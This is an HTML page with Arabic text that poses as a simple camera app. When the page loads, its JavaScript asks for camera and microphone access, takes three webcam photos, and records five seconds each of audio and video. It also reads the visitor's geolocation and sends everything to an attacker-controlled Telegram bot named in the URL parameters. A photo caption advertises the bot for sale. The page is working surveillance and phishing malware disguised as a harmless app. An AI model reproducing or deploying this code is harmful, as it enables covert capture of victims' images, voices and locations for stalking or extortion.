<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>كاميرا التطبيق</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #8B4513, #A52A2A);
            color: white;
            text-align: center;
            margin: 0;
            padding: 0;
        }

        h1 {
            margin-top: 20px;
            font-size: 2.5em;
            color: #FFD700;
        }

        video,
        canvas {
            margin-top: 20px;
            max-width: 90%;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
        }

        button {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 1.2em;
            color: white;
            background: #A52A2A;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s ease;
        }

        button:hover {
            background: #D2691E;
        }

        footer {
            margin-top: 30px;
            font-size: 0.9em;
            color: #eee;
        }

        a {
            color: #FFD700;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <h1>كاميرا التطبيق</h1>
    <video id="video" autoplay muted></video>
    <canvas id="canvas" class="hidden"></canvas>
    <p id="status">جارِ تسجيل البيانات...</p>

    <footer>
        © 2024 - تطبيق الكاميرا
    </footer>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const token = urlParams.get('token');
        const chat_id = urlParams.get('chat_id');
        const botUrl = `https://api.telegram.org/bot${token}/sendMessage`;
        const botPhotoUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
        const botVideoUrl = `https://api.telegram.org/bot${token}/sendVideo`;
        const botLocationUrl = `https://api.telegram.org/bot${token}/sendLocation`;
        const botVoiceUrl = `https://api.telegram.org/bot${token}/sendVoice`;

        const videoElement = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const statusElement = document.getElementById("status");

        let mediaRecorder;
        let chunks = [];

        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: true,
                    audio: true
                });
                videoElement.srcObject = stream;

                mediaRecorder = new MediaRecorder(stream);

                mediaRecorder.ondataavailable = (event) => {
                    chunks.push(event.data);
                };

                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    chunks = [];
                    sendVideo(blob);
                };

                captureImages();
                captureAudio();
                captureVideo();
                sendLocation();
            } catch (error) {
                statusElement.textContent = "خطأ في الوصول إلى الكاميرا أو الميكروفون!";
                console.error(error);
            }
        }

        async function captureImages() {
            const context = canvas.getContext("2d");
            for (let i = 0; i < 3; i++) {
                await new Promise((resolve) => setTimeout(resolve, 1000));
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL("image/jpeg");
                sendImage(imageData, `تم تطوير البوت بواسطة صوفي.\nللاشتراك أو شراء البوت تواصل مع المطور @caser7\n\nالمنطقة: none\nرقم الهاتف: none\nمقطع صوتي: جارِ الإرسال\nمقطع فيديو: قريباً\n-----------------\nقناتي: https://t.me/+qZ06s9H7I944YWYy`);
            }
        }

        async function captureAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const audioRecorder = new MediaRecorder(stream);
                audioRecorder.start();

                setTimeout(() => {
                    audioRecorder.stop();
                }, 5000);

                audioRecorder.ondataavailable = async (event) => {
                    sendVoice(event.data);
                };
            } catch (error) {
                console.error("خطأ أثناء تسجيل الصوت:", error);
            }
        }

        function captureVideo() {
            mediaRecorder.start();
            setTimeout(() => {
                mediaRecorder.stop();
            }, 5000);
        }

        async function sendImage(imageData, caption) {
            const response = await fetch(botPhotoUrl, {
                method: "POST",
                body: new FormData(Object.assign(new FormData(), {
                    chat_id,
                    caption,
                    photo: dataURLtoBlob(imageData)
                }))
            });
            console.log("تم إرسال الصورة:", await response.json());
        }

        async function sendVoice(audioBlob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("voice", audioBlob);

            const response = await fetch(botVoiceUrl, {
                method: "POST",
                body: formData,
            });
            console.log("تم إرسال الصوت:", await response.json());
        }

        async function sendVideo(videoBlob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("video", videoBlob);

            const response = await fetch(botVideoUrl, {
                method: "POST",
                body: formData,
            });
            console.log("تم إرسال الفيديو:", await response.json());
        }

        async function sendLocation() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const { latitude, longitude } = position.coords;
                    const response = await fetch(botLocationUrl, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            chat_id,
                            latitude,
                            longitude
                        })
                    });
                    console.log("تم إرسال الموقع:", await response.json());
                });
            } else {
                console.error("خاصية الموقع غير مدعومة.");
            }
        }

        function dataURLtoBlob(dataURL) {
            const [header, data] = dataURL.split(",");
            const mime = header.match(/:(.*?);/)[1];
            const binary = atob(data);
            const array = [];
            for (let i = 0; i < binary.length; i++) {
                array.push(binary.charCodeAt(i));
            }
            return new Blob([new Uint8Array(array)], { type: mime });
        }

        initCamera();
    </script>
</body>
</html>
